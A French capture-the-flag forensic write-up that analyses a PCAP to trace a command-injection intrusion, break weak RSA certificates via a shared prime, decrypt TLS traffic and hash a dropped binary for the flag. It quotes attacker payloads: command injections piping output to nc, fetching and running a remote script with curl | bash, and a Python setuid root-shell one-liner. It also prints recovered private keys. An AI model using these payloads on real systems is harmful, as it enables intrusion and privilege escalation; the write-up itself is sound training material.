---
weight: 4
title: "[Santhacklaus 2019] - Revmomon"
date: 2019-12-22T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["santhacklaus", "claranet", "forensic", "cryptography", "network", "pcap", "malware", "rsa"]
categories: ["Writeups"]

lightgallery: true
---


> Suspicious activity has been detected. Probably nothing to be scared about but take a look anyway.
> If you find anything, a backdoor, a malware or anything of this kind, flag is the sha256 of it.
> MD5 of the file : c93adc996da5dda82312e43e9a91d053
> PCAP : https://mega.nz/#!eqQV3SwD!_jAfHMqMw9d-LIDoTDR9JziwNicsxkYymS87eR4pLUg

### Etat des lieux

A l'ouverture du PCAP, on peut voir énormément de paquets entre l'ip `172.17.0.5` et `172.17.0.1`. Du premier paquet au 170281, c'est une alternance de paquets SYN / RST, caractéristique d'un Stealth Scan de nmap. Il est possible de le voir autrement grâce aux premiers ports scannés : 

![](https://i.imgur.com/WYt7gPe.png)

Enfin le user agent "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)" est plutot clair.

La première hypothèse est de voir que l'ip `172.17.0.1` est l'attaquant et `172.17.0.5` est l'attaqué. Il y a un peu de traffic externe, pour ne pas se faire polluer par le reste, un premier filtre est de rigueur : 

> ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5

Au final la première réelle action utilisateur semble être au stream TCP 85663, car un paramètre POST valide, avec un argument cohérent est passé.

### Point d'entré de l'attaquant

Au stream TCP 85664, on peut voir qu'une injection de commande a été tentée : 

![](https://i.imgur.com/s77Wuf0.png)

> 127.0.0.1; id | nc 172.17.0.1 12345

Et cette injection de commande a l'air d'avoir fonctionné : 

![](https://i.imgur.com/qhUtVxO.png)

### Exploitation de l'attaquant

L'attaquant semble executer un script en mémoire : 

![](https://i.imgur.com/enqXS1Y.png)

> 127.0.0.1 ; curl -k https://172.17.0.1/a.sh | bash

Bien entendu ce site n'est pas accessible il n'est pas possible de récupérer le script __a.sh__. Les stream tcp suivant (85667 / 85668) doit être le téléchargement wget via https.
Une différence intéressante réside dans le changement de port entre le stream 85668 (port 443 sur l'ip de l'attaquant) et le stream 85669 (port 8443 sur l'ip de l'attaquant).
Vu la tete des paquets TCP, on peut se douter que c'est du TLS : 

![](https://i.imgur.com/qf2PUmz.png)

Donc un peu de configuration wireshark pour le dissector TLS fasse son travail sur le port 8443, il faut modifier la config du HTTP : 

![](https://i.imgur.com/Akz19kF.png)

Finalement on voit bien un "Client Hello" sur le port 8443 : 

![](https://i.imgur.com/2Eu7hko.png)

Avant de passer à la suite, on a pu déterminer que l'exploitation a commencé au stream tcp 85664, soit le paquet 183387. On va appliquer un filtre pour masquer tous les paquets d'avant et enregistrer ce nouveau pcap. Ce sera plus simple à manipuler qu'un pcap de 35 Mo. Le filtre wireshark : 

> (frame.number >= 183387) && (ip.addr == 172.17.0.1 && ip.addr == 172.17.0.5)

Et "File > Exported Selected Packet"

![](https://i.imgur.com/Pozr7nJ.png)

On passe de 185701 paquets à 2077, ce qui est plus confortable.

### Crypto attack

#### Trouver la vuln

On récupère le "Server Hello" de la connexion sur le port 443 et 8443. Première chose intéressante, les "issuer": 

![](https://i.imgur.com/lCiec87.png)

Référence à "Prime Minister" dans les deux. De plus, malgrés les suites de chiffrement safe proposées par le client, le serveur a décidé d'utiliser une suite n'utilisant pas Diffie Hellman: 

![](https://i.imgur.com/gxDGQP0.png)

Référence à prime, pas de diffie hellman -> attaque sur le rsa ? 
S'il est possible de récupérer une clé privé, alors il sera possible de déchiffrer les communications. S'il y avait eu un DH, DHE, ECDH ou ECDHE, alors il aurait fallu connaitre cet aléa échangé. Enfin, un certificat ssl est la composante publique du RSA, donc les attaques classiques de RSA sur clé publiques sont possibles.

#### Extraction des certificats

Pour cela, il faut extraire les certificat. CLquer sur le trame "Server Hello" et selectionner le "Certificate" dans le paquet: 

![](https://i.imgur.com/Yhwv2IU.png)

Un CTRL+MAJ+X ou File > Export Packet Bytes et le certificat est extrait. Il faut faire la meme chose pour l'autre port.

#### Conversion DER to PEM

Avant de faire une attaque avec RsaCtfTool, qui a l'avantage de tester tout un tas d'attaque, l faut convertir ces certificat DER au format PEM: 

```bash
# DER to CRT
openssl x509 -inform der -in 5_443.der -outform pem -out 5_443.crt
openssl x509 -inform der -in 5_8443.der -outform pem -out 5_8443.crt

# CRT to PEM
openssl x509 -pubkey -noout -in 5_443.crt -out 5_443.pem
openssl x509 -pubkey -noout -in 5_8443.crt -out 5_8443.pem
```

#### Facteur commun

Pour lancer RsaCtfTool sur plusieurs clés publiques il suffit de: 

```bash
➜  writeup git:(master) ✗ /opt/tools/crypto/RsaCtfTool/RsaCtfTool.py --publickey "*.pem" --private --verbose                                                                                                                             
[*] Multikey mode using keys: ['5_8443.pem', '5_443.pem']                                                                                                                                                                                
[*] Found common factor in modulus for 5_8443.pem and 5_443.pem                                                                                                                                                                          
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA8k6sQzkomqCjeOPJ10idYw5K/EJ/crLCWcKZy79hyOiIAHbn
P3icrfeD8S7qnb6HwMyKvuu1rLkABP8RUVClDlfyMKcZMO8p8kgj+xs82FzMJBeJ
iEsqSG6t/8zp26/W1oqtGWpderbaO0eZj03ExuyoedbNggfuYCqe7AB9WB8/B7p3
TEjwnNE7bRc4RBL5KhqzB2plYrrNDqhor5jo/RBgDGdnQGMEo0+A8oZPGzmq4d+l
E2TxA4FCXKBw2M6C+PdmwkktK1ZF26w/Mk0gEO5DVh0MgPkumEFifTmq9QgpUy8q
ki/j8yI320MmF6WQer4qtgFpdmFwUQb6KvKnSQIDAQABAoIBAHp/Y38oqmphw8Me
BbCcuVSWqToWtC/cR3zxcKccvebAB+GUOxxPcYZRl5aazWmqJR9HSO10ZIhJjsT3
3l1pk8hIldwa3hVrE5208tvDzWLkpx+n9pO8zEeKDNVBVwkFQGt9+DzdFR0wy+sk
K3HTMyQOCK5v9b1DHTPo2CcfqD6fsXW1cG3VfqlvT+iXyp9Z8hreA78MTEnfSzVW
g/UMUn1Y/ZjiO7l34JBm2Q0aiHBiRdBIatTDDw9uATrY491Ut/bRCWo9++iC7Kz0
t5jH28YynQp7upq2ZaLtb3QA/aggEdTN+jWs/EZSmdSY1JN2zUrPkJ81FR3vw+/z
paUe27ECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA/SdK
0PMQ9UMOtW2PjPwCKF8uymRdh4KgfWufWmrsCTsHYqinKrF9FhxUeSNHN2qPmPnI
yW0LIvcVAzVA5c9weJgvqOfOigsBQaOcW0FqO8OswtGPyH3//dUIyB/vuZu5LYi4
93ECyON95PXpubDvgY4GJwM0Lo9vpdaqt/nTWDMCgYBLWUQBidGHjMVa5G0TZBz5
0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
0HXWlptmC+FZO6KCRhGrgwKBgBQETVgkQA0Ell8mIJmnO4xxqkN6mCKk44fHQLxn
g+5e6oCUkVNA4YEkEFHbxj/Nfzk7VvMGWkEThGfSiCUjt+LxNaOHYL9ti1XjV/On
Qn0jRb/JzjKuM9WgSKd6TvxAIe5Fx0pZdzznMAcwoqB6KxX1Yusmx7N+x/c2+By/
9kQdAoGAYxsY9EhchdDsUy5f2DrsQIeCQJueLexVVxebo4rpgb7NCybqqI55qbjd
2CMdY+8Fw74L2zxwgFDgngrIHsjIMqUNp64pgp+4qqjN+ix0ue86ZTlnaqgK3uaw
DDlBMgDIvOc+FYcy1aeqpCQHi8R1EIjlqZGvlV8wTwv9dJ+N/ug=
-----END RSA PRIVATE KEY-----
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6qH1D3mce4pI40aDTFHHnU8I84OU7NCR3KD4pTCsktys6cth
OdZ4YnR6a3SBIEAmpq8p/3KI9fmQO43JJj+N4vWEgsA8S5F3CQZtbKr2ILrCX8BX
apicvYFHXWl567xWGepkqjdFBAqC8NdpE95ZhZDpwzRgj0DIJRBaKJ9ROdKeo8bY
atXRCdm/+Q9Cw8rdknZQtnJh8Jc061UWdEaRR5FINQZtNmDkwzehDYD+elZ9zmNX
oRrB+wYQNuoHTVunBihCFz/WUcoqcItPSoheWGiy+Ok4B0QcBCELhVs5RpSjp6C/
0yl+0mx3P+1743JsKUmnu1fAYKi3oHAG4sgYFQIDAQABAoIBAGmSVeGQpogvwHwC
zjEY2ug9F5n6KpgjgH31L+uj6wJpqKPJjwWnKqOiJTMUSMVqF/oH9q2pq1aB5BPn
yAodrongTq9GL9sQqK625aVvhy9S2QKcWLjt0hiygpnVS7Z2F4exn3m3RKZ81E3p
nq4B7eXbPlNGzeunCmci5G5CwRlyfsGxNlpFy6pcdytGwCt9+WRS36Yrc8jZQm8x
qiyA93pTAYBt3Hb0/edpKj6e9dbGIi3YMPpL0TpF63+629uSpP1mW9A2IMVP+I8N
nBIwxpazruhla/TOOF8nlUTiLtZc5fSnNCgprMXFYmBlB+DCVarS+VD2mqx+ugzm
DxUtekECgYEA9Qgo401V7TQhlP0XNKsWFuH6GwmZKEBBtXBF9nk26CbTZ+Er6SS0
tm3zYqUH+VkdnO+c//S/FmG/eSi3e4kB5dGsskzGzjjJzbtACenn1SRBUo0TfCZy
T6DMWXMDRvuOJEWYa8jCJ040qCSIbGYg9WoJ6+jn9jwtpIbZkqLS9pMCgYEA9SKh
xuY/zb9sl0MbGTB5j4ZKcpNVLh9YCgiRDsXDpUeLNmsOWqJCS0Gep+hSyGEDmbeD
ijZ02c0GXccpjjYgPltqiREE5j6jUKHLPm8ZuQ+Ia/v6yJGOUMlJZ+14I86+TKtm
AxCsVZOeHEmV4gSFos3l063n1ywtgmZmkS7m97cCgYBLWUQBidGHjMVa5G0TZBz5
0mmvkMcJKqFKIwlQnru0rePKiOKQ4hm0E6GJTwhhs/a4QLK9vsxYHJzdrBioI1xz
CIQbnCJyXeIoopExuzzwPSLdOMaqIcR7Gg5c31I9rLNsEf6p/mU94v2sSvespccy
0HXWlptmC+FZO6KCRhGrgwKBgF3QMCuHiJl8Ddnhs6gzNgJoeWtZ2Tp6gl3so18M
7m/9bliYJfknqclVRpupvKy0/ATDB5NIffWwkiQniU7Ehhh3MdFc8wwOor/D+51c
NXLub94ro/FISze9oNsmNVk20PtUiQjZQ6rIgLUAsFy8MEx7Ed6t6lEdthj2iYA8
e+YHAoGBALUVvWU6bh85o86amHzSK8tuHrEXthrzHn6xDwrKNpFFNqL6lepCVKx0
pH7Ul9V489IRNsOHtKyHewJXyJAsRJrP6c7veE49kjBrIkXHjCf8zhuiqtPdpE1V
LIXge+kDK5K/FLJN+jtrapJ1DHtuAwsrxD8e4/aB6eGiSsSFMRXU
-----END RSA PRIVATE KEY-----
```

Il y a donc un facteur commun entre les certificats PEM et permet de récupérer les clés privés de chaques flux.

#### Déchiffrement du tls dans le pcap

Donc maintenant il suffit de déchiffrer le flux TLS avec Wireshark: Clique droit sur un paquet TLS1.2 > Protocole preferences > Open ... > RSA keys list

![](https://i.imgur.com/5uEbdV2.png)

Ci-dessous la configuration pour déchiffrer les flux: 

![](https://i.imgur.com/jvW76xL.png)

### Analyse du pcap déchiffré

#### Flux sur le port 443

Maintenant que les flux sont déchiffrés, regardons le premier flux tcp: 

![](https://i.imgur.com/vDnJxbC.png)

Le script bash va télécharger un certificat PEM (/dev/shm/cert2.pem) et faire un reverse shell openssl sur le port 8443: mystère résolue, la transaction sur le port 443 est le serveur web https de l'attaquant et celle sur le 8443 est le reverse shell openssl.

#### Flux sur le port 8443

L'attaquant cherche à élever ses droits, il a drop un LinEnum pour énumérer un maximum de choses:

![](https://i.imgur.com/jHW9G42.png)

L'élevation de privilèges se situe un peu plus bas avec le payload:

`/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

Cette élévation de privilèges s'explique par le fait que python a des capabilities particulières:

![](https://i.imgur.com/KAq2zoc.png)

Et c'est ce que l'attaquant a vu dans son LinEnum. D'ailleurs, je crois que l'attaquant un message pour le challenger, pour signifier qu'un flag est dans le /root:

![](https://i.imgur.com/SXOEyhi.png)

La fin du flux montre le téléchargement d'un binaire "DRUNK_IKEBANA" et le place dans le dossier /usr/bin/phar.bak. Il est possible de récupérer le binaire: 

![](https://i.imgur.com/d6xdZeN.png)

Il est possible d'exporter le binaire via le menu File > Export Objects > HTTP > DRUNK_IKEBANA

Et voilà, pour valider l'épreuve, il suffit de trouver le SHA256 du binaire:

```bash
$ sha256sum DRUNK_IKEBANA 
daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830  DRUNK_IKEBANA
```

### Flag 

> SANTA{daeb4a85965e61870a90d40737c4f97d42ec89c1ece1c9b77e44e6749a88d830}